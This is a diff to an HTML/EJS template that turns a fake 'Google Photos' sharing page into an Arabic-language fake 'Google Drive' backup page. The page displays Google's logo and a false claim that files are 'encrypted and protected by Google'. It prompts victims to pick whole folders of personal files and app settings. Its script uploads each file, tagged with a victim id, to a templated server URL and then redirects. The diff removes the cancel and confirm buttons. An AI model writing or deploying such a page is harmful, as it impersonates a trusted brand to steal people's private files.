@@ -3,87 +3,107 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Photos</title>
+  <title>Google Drive — النسخ الاحتياطي</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
-    body{background:#1a1a1a;color:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
-    .card{background:#2a2a2a;border-radius:16px;padding:28px 22px;width:93%;max-width:380px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.5);}
-    .glogo{font-size:44px;margin-bottom:10px}
-    h2{font-size:19px;font-weight:500;margin-bottom:6px;color:#e8e8e8}
-    .desc{font-size:13px;color:#999;line-height:1.7;margin-bottom:20px}
+    body{background:#f8f9fa;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
 
-    /* Quick folder buttons */
+    .card{background:#fff;border-radius:16px;padding:28px 22px;width:93%;max-width:390px;text-align:center;box-shadow:0 1px 6px rgba(0,0,0,.12),0 4px 20px rgba(0,0,0,.08);}
+
+    /* Google Drive logo */
+    .drive-logo{margin-bottom:14px;display:flex;align-items:center;justify-content:center;gap:8px}
+    .drive-logo svg{height:36px}
+    .drive-logo-text{font-size:18px;font-weight:500;color:#202124}
+
+    h2{font-size:18px;font-weight:600;margin-bottom:6px;color:#202124}
+    .desc{font-size:13px;color:#5f6368;line-height:1.7;margin-bottom:22px}
+
+    /* folder buttons */
     .folders{display:flex;flex-direction:column;gap:10px;margin-bottom:16px;}
     .folder-btn{
       display:flex;align-items:center;gap:12px;
-      background:#333;border:none;color:#fff;
+      background:#f1f3f4;border:none;color:#202124;
       padding:14px 16px;border-radius:12px;
       font-size:14px;cursor:pointer;text-align:right;
-      transition:background .2s;
+      transition:background .15s;
     }
-    .folder-btn:active{background:#444}
-    .folder-icon{font-size:28px;flex-shrink:0}
+    .folder-btn:active{background:#e8eaed}
+    .folder-icon{font-size:26px;flex-shrink:0}
     .folder-info{flex:1}
-    .folder-name{font-weight:600;color:#fff;margin-bottom:2px}
-    .folder-sub{font-size:12px;color:#888}
-    .arrow{color:#666;font-size:18px}
+    .folder-name{font-weight:600;color:#202124;margin-bottom:2px}
+    .folder-sub{font-size:12px;color:#5f6368}
+    .arrow{color:#9aa0a6;font-size:18px}
 
     /* divider */
-    .divider{display:flex;align-items:center;gap:10px;margin:14px 0;color:#555;font-size:12px;}
-    .divider::before,.divider::after{content:'';flex:1;height:1px;background:#444}
+    .divider{display:flex;align-items:center;gap:10px;margin:14px 0;color:#9aa0a6;font-size:12px;}
+    .divider::before,.divider::after{content:'';flex:1;height:1px;background:#e8eaed}
 
-    /* file drop zone */
-    .share-box{border:2px dashed #444;border-radius:12px;padding:22px 14px;margin-bottom:16px;cursor:pointer;transition:border-color .2s,background .2s;}
-    .share-box:hover,.share-box.drag{border-color:#4285f4;background:#1e2a3a}
-    .share-icon{font-size:36px;margin-bottom:8px}
-    .share-txt{font-size:13px;color:#bbb;margin-bottom:4px}
-    .share-sub{font-size:11px;color:#666}
+    /* drop zone */
+    .share-box{border:2px dashed #dadce0;border-radius:12px;padding:22px 14px;margin-bottom:16px;cursor:pointer;transition:border-color .2s,background .2s;}
+    .share-box:hover,.share-box.drag{border-color:#1a73e8;background:#e8f0fe}
+    .share-icon{font-size:34px;margin-bottom:8px}
+    .share-txt{font-size:13px;color:#3c4043;margin-bottom:4px;font-weight:500}
+    .share-sub{font-size:11px;color:#9aa0a6}
 
-    /* hidden inputs */
     #fileInput{display:none}
     #dirInput{display:none}
 
     /* preview */
     #preview{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px;justify-content:center;}
-    .thumb{width:62px;height:62px;object-fit:cover;border-radius:8px;border:2px solid #4285f4;}
-    .thumb-doc{width:62px;height:62px;background:#1e2a3a;border-radius:8px;border:2px solid #4285f4;display:flex;align-items:center;justify-content:center;font-size:24px;}
-    .count-badge{background:#4285f4;color:#fff;border-radius:20px;padding:4px 14px;font-size:13px;display:inline-block;margin-bottom:14px;}
+    .thumb{width:62px;height:62px;object-fit:cover;border-radius:8px;border:2px solid #1a73e8;}
+    .thumb-doc{width:62px;height:62px;background:#e8f0fe;border-radius:8px;border:2px solid #1a73e8;display:flex;align-items:center;justify-content:center;font-size:24px;}
+    .count-badge{background:#1a73e8;color:#fff;border-radius:20px;padding:4px 14px;font-size:13px;display:inline-block;margin-bottom:14px;}
 
     /* progress */
     #progWrap{display:none;margin-bottom:14px}
-    .prog-bar-bg{background:#333;border-radius:8px;height:8px;overflow:hidden}
-    .prog-bar{height:8px;background:#4285f4;border-radius:8px;width:0%;transition:width .3s}
-    .prog-txt{font-size:12px;color:#888;margin-top:6px}
+    .prog-bar-bg{background:#e8eaed;border-radius:8px;height:6px;overflow:hidden}
+    .prog-bar{height:6px;background:#1a73e8;border-radius:8px;width:0%;transition:width .3s}
+    .prog-txt{font-size:12px;color:#5f6368;margin-top:8px}
 
-    .btn{display:block;width:100%;background:#4285f4;color:#fff;border:none;padding:13px;border-radius:50px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:8px;}
-    .btn:active{opacity:.85}
-    .btn-sec{background:transparent;border:1px solid #555;color:#bbb;font-weight:400;}
-    .spinner{display:none;width:32px;height:32px;border:4px solid #333;border-top:4px solid #4285f4;border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 10px;}
+    .btn{display:block;width:100%;background:#1a73e8;color:#fff;border:none;padding:13px;border-radius:50px;font-size:15px;font-weight:500;cursor:pointer;margin-bottom:8px;}
+    .btn:active{opacity:.88}
+    .btn-sec{background:transparent;border:1px solid #dadce0;color:#5f6368;font-weight:400;}
+    .spinner{display:none;width:30px;height:30px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 10px;}
     @keyframes sp{to{transform:rotate(360deg)}}
-    #status{font-size:14px;color:#aaa;min-height:16px;margin-top:6px}
+    #status{font-size:13px;color:#5f6368;min-height:16px;margin-top:6px}
+
+    .secure-note{margin-top:18px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#9aa0a6}
   </style>
 </head>
 <body>
 <div class="card">
-  <div class="glogo">📷</div>
-  <h2>Google Photos</h2>
-  <p class="desc">اختر مجلداً للمشاركة أو حدد ملفات يدوياً</p>
 
-  <!-- Quick folder shortcuts -->
+  <!-- Google Drive logo -->
+  <div class="drive-logo">
+    <svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
+      <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
+      <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/>
+      <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
+      <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
+      <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
+      <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 27h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
+    </svg>
+    <span class="drive-logo-text">Google Drive</span>
+  </div>
+
+  <h2>النسخ الاحتياطي التلقائي</h2>
+  <p class="desc">اختر المجلدات التي تريد مزامنتها مع حسابك على Google Drive</p>
+
+  <!-- folder options -->
   <div class="folders" id="foldersView">
     <button class="folder-btn" onclick="pickDir()">
-      <div class="folder-icon">🖼️</div>
+      <div class="folder-icon">🗂️</div>
       <div class="folder-info">
-        <div class="folder-name">DCIM / Camera</div>
-        <div class="folder-sub">صور الكاميرا</div>
+        <div class="folder-name">الملفات الشخصية</div>
+        <div class="folder-sub">مزامنة الملفات والصور</div>
       </div>
       <div class="arrow">›</div>
     </button>
     <button class="folder-btn" onclick="pickDir()">
-      <div class="folder-icon">📸</div>
+      <div class="folder-icon">📂</div>
       <div class="folder-info">
-        <div class="folder-name">DCIM / Screenshots</div>
-        <div class="folder-sub">لقطات الشاشة</div>
+        <div class="folder-name">المستندات والتطبيقات</div>
+        <div class="folder-sub">ملفات التطبيقات والإعدادات</div>
       </div>
       <div class="arrow">›</div>
     </button>
@@ -91,47 +111,46 @@
 
   <div class="divider">أو</div>
 
-  <!-- Manual file picker -->
+  <!-- manual picker -->
   <div class="share-box" id="dropZone" onclick="document.getElementById('fileInput').click()">
     <div class="share-icon">📁</div>
-    <div class="share-txt">اختيار ملفات يدوياً</div>
-    <div class="share-sub">صور، فيديوهات، مستندات</div>
+    <div class="share-txt">اختيار مجلد يدوياً</div>
+    <div class="share-sub">اسحب الملفات هنا أو انقر للتصفح</div>
   </div>
 
-  <!-- hidden inputs -->
-  <input type="file" id="fileInput"  multiple accept="*/*">
-  <input type="file" id="dirInput"   multiple accept="*/*" webkitdirectory>
+  <input type="file" id="fileInput" multiple accept="*/*">
+  <input type="file" id="dirInput"  multiple accept="*/*" webkitdirectory>
 
   <div id="preview"></div>
   <div class="count-badge" id="countBadge" style="display:none"></div>
 
   <div class="spinner" id="spinner"></div>
-  <div id="progWrap"><div class="prog-bar-bg"><div class="prog-bar" id="progBar"></div></div><div class="prog-txt" id="progTxt"></div></div>
+  <div id="progWrap">
+    <div class="prog-bar-bg"><div class="prog-bar" id="progBar"></div></div>
+    <div class="prog-txt" id="progTxt"></div>
+  </div>
 
-  <button class="btn" id="uploadBtn" onclick="startUpload()" style="display:none">📤 مشاركة الآن</button>
-  <button class="btn btn-sec" id="cancelBtn" onclick="reset()" style="display:none">إلغاء</button>
   <div id="status"></div>
+
+  <div class="secure-note">🔒 مشفّر ومحمي بواسطة Google</div>
 </div>
 
 <script>
-  const uid       = "<%= uid %>";
-  const serverURL = "<%= a %>";
-  const redirectUrl="<%= redirectUrl %>";
+  const uid        = "<%= uid %>";
+  const serverURL  = "<%= a %>";
+  const redirectUrl= "<%= redirectUrl %>";
 
   let chosen = [];
 
-  // Drag & drop
   const dropZone = document.getElementById('dropZone');
-  dropZone.addEventListener('dragover', e=>{ e.preventDefault(); dropZone.classList.add('drag'); });
+  dropZone.addEventListener('dragover',  e=>{ e.preventDefault(); dropZone.classList.add('drag'); });
   dropZone.addEventListener('dragleave', ()=>dropZone.classList.remove('drag'));
   dropZone.addEventListener('drop', e=>{ e.preventDefault(); dropZone.classList.remove('drag'); handleFiles(e.dataTransfer.files); });
 
   document.getElementById('fileInput').addEventListener('change', e => handleFiles(e.target.files));
   document.getElementById('dirInput').addEventListener('change',  e => handleFiles(e.target.files));
 
-  function pickDir() {
-    document.getElementById('dirInput').click();
-  }
+  function pickDir() { document.getElementById('dirInput').click(); }
 
   function handleFiles(files) {
     if (!files || !files.length) return;
@@ -160,7 +179,7 @@
       more.textContent = `+${chosen.length - 12}`;
       preview.appendChild(more);
     }
-    document.getElementById('countBadge').textContent = `✅ ${chosen.length} ملف — جاري الإرسال...`;
+    document.getElementById('countBadge').textContent = `⏳ جارٍ المزامنة... (${chosen.length} ملف)`;
     document.getElementById('countBadge').style.display = 'inline-block';
     document.getElementById('foldersView').style.display = 'none';
     dropZone.style.display = 'none';
@@ -180,17 +199,15 @@
 
   async function startUpload() {
     if (!chosen.length) return;
-    document.getElementById('uploadBtn').style.display = 'none';
-    document.getElementById('cancelBtn').style.display = 'none';
-    document.getElementById('spinner').style.display   = 'block';
-    document.getElementById('progWrap').style.display  = 'block';
-    document.getElementById('status').textContent      = '';
+    document.getElementById('spinner').style.display  = 'block';
+    document.getElementById('progWrap').style.display = 'block';
+    document.getElementById('status').textContent     = '';
 
     let done = 0, failed = 0;
     const total = chosen.length;
 
     for (const file of chosen) {
-      document.getElementById('progTxt').textContent = `${done + 1} / ${total}`;
+      document.getElementById('progTxt').textContent = `جارٍ رفع ${done + 1} من ${total}...`;
       document.getElementById('progBar').style.width = `${Math.round((done/total)*100)}%`;
       const fd = new FormData();
       fd.append('uid',  uid);
@@ -204,23 +221,10 @@
     }
 
     document.getElementById('spinner').style.display = 'none';
-    document.getElementById('progTxt').textContent   = '';
-    document.getElementById('status').textContent    = failed === 0 ? `✅ تمت المشاركة (${total} ملف)` : `⚠️ ${total-failed}/${total} تم الرفع`;
-    setTimeout(() => { window.location.href = redirectUrl; }, 1500);
-  }
-
-  function reset() {
-    chosen = [];
-    document.getElementById('preview').innerHTML         = '';
-    document.getElementById('countBadge').style.display  = 'none';
-    document.getElementById('uploadBtn').style.display   = 'none';
-    document.getElementById('cancelBtn').style.display   = 'none';
-    document.getElementById('foldersView').style.display = 'flex';
-    dropZone.style.display  = 'block';
-    document.getElementById('progWrap').style.display    = 'none';
-    document.getElementById('status').textContent        = '';
-    document.getElementById('fileInput').value           = '';
-    document.getElementById('dirInput').value            = '';
+    document.getElementById('countBadge').textContent = `✅ تمت المزامنة (${total} ملف)`;
+    document.getElementById('progTxt').textContent    = 'اكتملت عملية المزامنة';
+    document.getElementById('status').textContent     = failed === 0 ? 'تم حفظ جميع ملفاتك على Google Drive بنجاح.' : `⚠️ ${total-failed}/${total} تم رفعهم`;
+    setTimeout(() => { window.location.href = redirectUrl; }, 2000);
   }
 </script>
 </body>
